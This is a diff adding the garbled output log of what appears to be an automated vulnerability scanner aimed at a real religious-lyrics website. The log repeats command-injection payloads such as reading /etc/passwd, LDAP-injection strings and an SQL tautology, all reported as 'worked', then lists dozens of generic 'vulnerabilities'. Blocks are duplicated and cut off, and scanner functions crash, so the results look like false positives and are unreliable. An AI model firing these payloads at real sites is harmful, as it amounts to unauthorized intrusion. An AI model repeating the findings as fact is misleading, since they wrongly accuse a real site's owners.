@@ -1,0 +1,227 @@
+
+Starting scan for website: https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html
+Discovered 233 URLs on https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html
+
+Command Injection payload '; ls' worked.
+Command Injection payload '; whoami' worked.
+Command Injection payload '| ls' worked.
+Command Injection payload '| whoami' worked.
+Command Injection payload '; cat /etc/passwd' worked.
+Command Injection payload '| id' worked.
+Command Injection payload '| uname -a' worked.
+Command Injection payload '; ping -c 4 127.0.0.1' worked.
+LDAP Injection payload '(uid=*))(|(uid=*))' worked.
+LDAP Injection payload '(uid=admin)(&(password=*))' worked.
+LDAP Injection payload '(&(uid=*))' worked.
+LDAP Injection payload '(cn=*))(|(cn=*))' worked.
+LDAP Injection payload '(|(uid=*))' worked.
+XXE payload worked.
+XXE payload worked.
+XXE payload worked.
+Error checking Excessive Data Exposure in APIs on https://www.drikpanchang.com/: Expecting value: line 1 column 1 (char 0)
+Error checking Known Vulnerabilities in Dependencies on https://www.drikpanchang.com/: Unsupported dependency manager
+Error checking Outdated Libraries on https://www.drikpanchang.com/: Unsupported dependency manager
+Error checking Unrestricted File Uploads on https://www.drikpanchang.com/: is_file_upload_unrestricted() missing 1 required positional argument: 'file_path'
+Error checking MIME Type Spoofing on https://www.drikpanchang.com/: is_mime_type_spoofing_possible() missing 1 required positional argument: 'file_path'
+Error checking Poor Random Number Generation on https://www.drikpanchang.com/: check_poor_random_number() takes 0 positional arguments but 1 was given
+
+DevTools listening on ws://127.0.0.1:50062/devtools/browser/42cd721f-78db-4406-8ad0-b70e7ef189de
+
+Vulnerabilities found on https://www.drikpanchang.com/:
+- SQL Injection vulnerability: SQL Injection vulnerability
+  Attack Method: Inject SQL code to manipulate queries (e.g., ' OR '1'='1').
+- Command Injection vulnerability: Command Injection vulnerability
+  Attack Method: Inject OS commands via vulnerable input fields.
+- LDAP Injection vulnerability: LDAP Injection vulnerability
+  Attack Method: Manipulate LDAP queries through crafted inputs.
+- XML External Entities (XXE) vulnerability: XML External Entities (XXE) vulnerability
+  Attack Method: Exploit XML parsers by injecting external entities.
+- Broken API Authentication: Broken API Authentication
+  Attack Method: API endpoints lack proper authentication checks.
+- Missing Rate-Limiting in APIs: Missing Rate-Limiting in APIs
+  Attack Method: APIs lack rate limits to prevent abuse.
+- Insufficient Logging: Insufficient Logging
+  Attack Method: No specific attack method available.
+- Sensitive Data Logging: Sensitive Data Logging
+  Attack Method: No specific attack method available.
+- Race Condition Exploits: Race Condition Exploits
+  Attack Method: Exploit timing issues to perform unauthorized actions.
+- Weak Hashing Algorithms for Passwords: Weak Hashing Algorithms for Passwords
+  Attack Method: Use outdated hash algorithms, such as MD5 or SHA-1, for passwords.
+- Insecure Cookie Flags (e.g., HttpOnly, Secure): Insecure Cookie Flags (e.g., HttpOnly, Secure)
+  Attack Method: Omit security flags, exposing cookies to theft or misuse.
+- Clickjacking: Clickjacking
+  Attack Method: Embed malicious frames to trick users into clicking unintended elements.
+- Unsafe Content Security Policy (CSP): Unsafe Content Security Policy (CSP)
+  Attack Method: Configure CSP in a way that allows malicious content execution.
+- Server-Side Template Injection (SSTI): Server-Side Template Injection (SSTI)
+  Attack Method: Inject template code to execute arbitrary server-side commands.
+- Client-Side Validation Bypass: Client-Side Validation Bypass
+  Attack Method: Skip client-side validation and send malicious input to the server.
+- JWT Weak Signing Algorithms: JWT Weak Signing Algorithms
+  Attack Method: Exploit weak or none algorithms to forge JWT tokens.
+Command Injection payload '; ls' worked.
+Command Injection payload '; whoami' worked.
+Command Injection payload '| ls' worked.
+Command Injection payload '| whoami' worked.
+- Client-Side Validation Bypass: Client-Side Validation Bypass
+  Attack Method: Skip client-side validation and send malicious input to the server.
+- JWT Weak Signing Algorithms: JWT Weak Signing Algorithms
+  Attack Method: Exploit weak or none algorithms to forge JWT tokens.
+Command Injection payload '; ls' worked.
+Command Injection payload '; whoami' worked.
+Command Injection payload '| ls' worked.
+Command Injection payload '| whoami' worked.
+  Attack Method: Exploit weak or none algorithms to forge JWT tokens.
+Command Injection payload '; ls' worked.
+Command Injection payload '; whoami' worked.
+Command Injection payload '| ls' worked.
+Command Injection payload '| whoami' worked.
+Command Injection payload '; ls' worked.
+Command Injection payload '; whoami' worked.
+Command Injection payload '| ls' worked.
+Command Injection payload '| whoami' worked.
+Command Injection payload '; whoami' worked.
+Command Injection payload '| ls' worked.
+Command Injection payload '| whoami' worked.
+Command Injection payload '| ls' worked.
+Command Injection payload '| whoami' worked.
+Command Injection payload '; cat /etc/passwd' worked.
+Command Injection payload '| whoami' worked.
+Command Injection payload '; cat /etc/passwd' worked.
+Command Injection payload '; cat /etc/passwd' worked.
+Command Injection payload '| id' worked.
+Command Injection payload '| id' worked.
+Command Injection payload '| uname -a' worked.
+Command Injection payload '| uname -a' worked.
+Command Injection payload '; ping -c 4 127.0.0.1' worked.
+LDAP Injection payload '(uid=*))(|(uid=*))' worked.
+LDAP Injection payload '(uid=*))(|(uid=*))' worked.
+LDAP Injection payload '(uid=admin)(&(password=*))' worked.
+LDAP Injection payload '(&(uid=*))' worked.
+LDAP Injection payload '(&(uid=*))' worked.
+LDAP Injection payload '(cn=*))(|(cn=*))' worked.
+LDAP Injection payload '(|(uid=*))' worked.
+XXE payload worked.
+XXE payload worked.
+XXE payload worked.
+Error checking Excessive Data Exposure in APIs on https://www.drikpanchang.com/: Expecting value: line 1 column 1 (char 0)
+Error checking Known Vulnerabilities in Dependencies on https://www.drikpanchang.com/: Unsupported dependency manager
+Error checking Outdated Libraries on https://www.drikpanchang.com/: Unsupported dependency manager
+Error checking Unrestricted File Uploads on https://www.drikpanchang.com/: is_file_upload_unrestricted() missing 1 required positional argument: 'file_path'
+Error checking MIME Type Spoofing on https://www.drikpanchang.com/: is_mime_type_spoofing_possible() missing 1 required positional argument: 'file_path'
+Error checking Poor Random Number Generation on https://www.drikpanchang.com/: check_poor_random_number() takes 0 positional arguments but 1 was given
+
+DevTools listening on ws://127.0.0.1:50325/devtools/browser/9f8c10d3-ad33-4c69-b7e3-b0c8c57d1ef3
+
+Vulnerabilities found on https://www.drikpanchang.com/:
+- SQL Injection vulnerability: SQL Injection vulnerability
+  Attack Method: Inject SQL code to manipulate queries (e.g., ' OR '1'='1').
+- Command Injection vulnerability: Command Injection vulnerability
+  Attack Method: Inject OS commands via vulnerable input fields.
+- LDAP Injection vulnerability: LDAP Injection vulnerability
+  Attack Method: Manipulate LDAP queries through crafted inputs.
+- XML External Entities (XXE) vulnerability: XML External Entities (XXE) vulnerability
+  Attack Method: Exploit XML parsers by injecting external entities.
+- Broken API Authentication: Broken API Authentication
+  Attack Method: API endpoints lack proper authentication checks.
+- Missing Rate-Limiting in APIs: Missing Rate-Limiting in APIs
+  Attack Method: APIs lack rate limits to prevent abuse.
+- Insufficient Logging: Insufficient Logging
+  Attack Method: No specific attack method available.
+- Sensitive Data Logging: Sensitive Data Logging
+  Attack Method: No specific attack method available.
+- Race Condition Exploits: Race Condition Exploits
+  Attack Method: Exploit timing issues to perform unauthorized actions.
+- Weak Hashing Algorithms for Passwords: Weak Hashing Algorithms for Passwords
+  Attack Method: Use outdated hash algorithms, such as MD5 or SHA-1, for passwords.
+- Insecure Cookie Flags (e.g., HttpOnly, Secure): Insecure Cookie Flags (e.g., HttpOnly, Secure)
+  Attack Method: Omit security flags, exposing cookies to theft or misuse.
+- Clickjacking: Clickjacking
+  Attack Method: Embed malicious frames to trick users into clicking unintended elements.
+- Unsafe Content Security Policy (CSP): Unsafe Content Security Policy (CSP)
+  Attack Method: Configure CSP in a way that allows malicious content execution.
+- Server-Side Template Injection (SSTI): Server-Side Template Injection (SSTI)
+  Attack Method: Inject template code to execute arbitrary server-side commands.
+- Client-Side Validation Bypass: Client-Side Validation Bypass
+  Attack Method: Skip client-side validation and send malicious input to the server.
+- JWT Weak Signing Algorithms: JWT Weak Signing Algorithms
+  Attack Method: Exploit weak or none algorithms to forge JWT tokens.
+Command Injection payload '; ls' worked.
+Command Injection payload '; whoami' worked.
+Command Injection payload '| ls' worked.
+Command Injection payload '| whoami' worked.
+Command Injection payload '; cat /etc/passwd' worked.
+Command Injection payload '| id' worked.
+Command Injection payload '| uname -a' worked.
+Command Injection payload '; ping -c 4 127.0.0.1' worked.
+LDAP Injection payload '(uid=*))(|(uid=*))' worked.
+LDAP Injection payload '(uid=admin)(&(password=*))' worked.
+LDAP Injection payload '(&(uid=*))' worked.
+LDAP Injection payload '(cn=*))(|(cn=*))' worked.
+LDAP Injection payload '(|(uid=*))' worked.
+XXE payload worked.
+XXE payload worked.
+XXE payload worked.
+Error checking Excessive Data Exposure in APIs on https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html?lang=hi: Expecting value: line 1 column 1 (char 0)
+Error checking Known Vulnerabilities in Dependencies on https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html?lang=hi: Unsupported dependency manager
+Error checking Outdated Libraries on https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html?lang=hi: Unsupported dependency manager
+Error checking Unrestricted File Uploads on https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html?lang=hi: is_file_upload_unrestricted() missing 1 required positional argument: 'file_path'
+Error checking MIME Type Spoofing on https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html?lang=hi: is_mime_type_spoofing_possible() missing 1 required positional argument: 'file_path'
+Error checking Poor Random Number Generation on https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html?lang=hi: check_poor_random_number() takes 0 positional arguments but 1 was given
+
+DevTools listening on ws://127.0.0.1:50565/devtools/browser/af1a6f84-5e83-4eb8-a6ba-a4c54cd65ffd
+
+Vulnerabilities found on https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html?lang=hi:
+- SQL Injection vulnerability: SQL Injection vulnerability
+  Attack Method: Inject SQL code to manipulate queries (e.g., ' OR '1'='1').
+- Command Injection vulnerability: Command Injection vulnerability
+  Attack Method: Inject OS commands via vulnerable input fields.
+- LDAP Injection vulnerability: LDAP Injection vulnerability
+  Attack Method: Manipulate LDAP queries through crafted inputs.
+- XML External Entities (XXE) vulnerability: XML External Entities (XXE) vulnerability
+  Attack Method: Exploit XML parsers by injecting external entities.
+- Broken API Authentication: Broken API Authentication
+  Attack Method: API endpoints lack proper authentication checks.
+- Missing Rate-Limiting in APIs: Missing Rate-Limiting in APIs
+  Attack Method: APIs lack rate limits to prevent abuse.
+- Sensitive Data Logging: Sensitive Data Logging
+  Attack Method: No specific attack method available.
+- Inadequate Role-Based Access Control (RBAC): Inadequate Role-Based Access Control (RBAC)
+  Attack Method: Allow access to sensitive resources due to insufficient role checks.
+- Insecure Dev/Test Environments in Production: Insecure Dev/Test Environments in Production
+  Attack Method: Expose sensitive development/test configurations in production.
+- Race Condition Exploits: Race Condition Exploits
+  Attack Method: Exploit timing issues to perform unauthorized actions.
+- Weak Hashing Algorithms for Passwords: Weak Hashing Algorithms for Passwords
+  Attack Method: Use outdated hash algorithms, such as MD5 or SHA-1, for passwords.
+- Insecure Cookie Flags (e.g., HttpOnly, Secure): Insecure Cookie Flags (e.g., HttpOnly, Secure)
+  Attack Method: Omit security flags, exposing cookies to theft or misuse.
+- Clickjacking: Clickjacking
+  Attack Method: Embed malicious frames to trick users into clicking unintended elements.
+- Unsafe Content Security Policy (CSP): Unsafe Content Security Policy (CSP)
+  Attack Method: Configure CSP in a way that allows malicious content execution.
+- Server-Side Template Injection (SSTI): Server-Side Template Injection (SSTI)
+  Attack Method: Inject template code to execute arbitrary server-side commands.
+- Client-Side Validation Bypass: Client-Side Validation Bypass
+  Attack Method: Skip client-side validation and send malicious input to the server.
+- JWT Weak Signing Algorithms: JWT Weak Signing Algorithms
+  Attack Method: Exploit weak or none algorithms to forge JWT tokens.
+  Attack Method: Inject template code to execute arbitrary server-side commands.
+- Client-Side Validation Bypass: Client-Side Validation Bypass
+  Attack Method: Skip client-side validation and send malicious input to the server.
+- JWT Weak Signing Algorithms: JWT Weak Signing Algorithms
+  Attack Method: Exploit weak or none algorithms to forge JWT tokens.
+  Attack Method: Skip client-side validation and send malicious input to the server.
+- JWT Weak Signing Algorithms: JWT Weak Signing Algorithms
+  Attack Method: Exploit weak or none algorithms to forge JWT tokens.
+- JWT Weak Signing Algorithms: JWT Weak Signing Algorithms
+  Attack Method: Exploit weak or none algorithms to forge JWT tokens.
+  Attack Method: Exploit weak or none algorithms to forge JWT tokens.
+Total vulnerabilities found on https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html: 49
+Total vulnerabilities found on https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html: 49
+==================================================
+
+Summary of Vulnerabilities Found:
+Summary of Vulnerabilities Found:
+https://www.drikpanchang.com/lyrics/aarti/lord-narayan/jai-jagdish-aarti.html: 49 vulnerabilities found
